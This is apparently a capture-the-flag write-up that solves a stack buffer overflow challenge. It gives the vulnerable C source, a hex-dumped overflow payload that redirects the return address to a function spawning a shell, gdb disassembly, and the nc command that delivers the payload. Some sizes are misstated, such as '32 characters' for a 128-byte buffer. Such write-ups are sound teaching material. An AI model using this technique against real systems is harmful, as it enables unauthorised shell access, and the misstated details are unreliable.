# Stacked

**Points**: 75

`nc pwn.osucyber.club 13379`

## Solution
```c
int not_called() {
	return system("/bin/bash");
}

void get_name() {
	char buf[128];
	scanf("%s", buf);
	printf("Hi, %s\n", buf);
}

int main(int argc, char** argv) {
	setvbuf(stdout, 0, 2, 0);
	printf("Hi, please enter your name:\n");
	get_name();
	printf("Goodbye\n");
}
```

This is a [stack smashing](https://en.wikipedia.org/wiki/Stack_buffer_overflow)
problem. I created a `access.txt` containing an input that would overflow `buf`
and set the return address on the stack.

```sh
$ xxd access.txt
00000000: 1122 3344 5566 7788 1122 3344 5566 7788  ."3DUfw.."3DUfw.
00000010: 1122 3344 5566 7788 1122 3344 5566 7788  ."3DUfw.."3DUfw.
00000020: 1122 3344 5566 7788 1122 3344 5566 7788  ."3DUfw.."3DUfw.
00000030: 1122 3344 5566 7788 1122 3344 5566 7788  ."3DUfw.."3DUfw.
00000040: 1122 3344 5566 7788 1122 3344 5566 7788  ."3DUfw.."3DUfw.
00000050: 1122 3344 5566 7788 1122 3344 5566 7788  ."3DUfw.."3DUfw.
00000060: 1122 3344 5566 7788 1122 3344 5566 7788  ."3DUfw.."3DUfw.
00000070: 1122 3344 5566 7788 1122 aabb ccdd eeff  ."3DUfw.."......
00000080: 1122 3344 5566 7788 0000 0000 3685 0408  ."3DUfw.....6...
```

- The bytes from 0x0 to 0x80 (exclusive) fill `buf` with 32 characters.
- The bytes from 0x80 to 0x88 (exclusive) overwrite the saved frame pointer,
  which we don't care about.
- The last 8 bytes overwrite the return address, we set to `0x08048536`. With
  little-endian ordering, the bytes need to be reversed.

We set the return address to `0x08048536` because that's the address of the
function `not_called()`. This address can be found using `gdb`

```sh
$ gdb pwn
Reading symbols from pwn...(no debugging symbols found)...done.
(gdb) disassemble not_called
Dump of assembler code for function not_called:
   0x08048536 <+0>: push   %ebp
   0x08048537 <+1>: mov    %esp,%ebp
   0x08048539 <+3>: push   %ebx
   0x0804853a <+4>: sub    $0x4,%esp
   0x0804853d <+7>: call   0x8048616 <__x86.get_pc_thunk.ax>
   0x08048542 <+12>:    add    $0x1abe,%eax
   0x08048547 <+17>:    sub    $0xc,%esp
   0x0804854a <+20>:    lea    -0x1960(%eax),%edx
   0x08048550 <+26>:    push   %edx
   0x08048551 <+27>:    mov    %eax,%ebx
   0x08048553 <+29>:    call   0x80483d0 <system@plt>
   0x08048558 <+34>:    add    $0x10,%esp
   0x0804855b <+37>:    mov    -0x4(%ebp),%ebx
   0x0804855e <+40>:    leave
   0x0804855f <+41>:    ret
End of assembler dump.
(gdb)
```

To submit the input, I ran this

```sh
cat access.txt - | nc pwn.osucyber.club 13379
```
